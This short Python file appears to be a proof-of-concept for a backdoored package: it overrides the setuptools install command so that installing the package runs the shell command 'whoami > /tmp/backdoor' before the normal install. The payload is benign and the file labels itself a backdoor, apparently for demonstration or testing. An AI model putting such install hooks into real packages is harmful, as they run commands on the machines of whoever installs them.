from os import system
from setuptools.command.install import install as base

# Install class overload
class install(base):
    """
    Backdoored install function that allows command execution
    """

    def run(self):
        system('whoami > /tmp/backdoor')
        base.run(self)
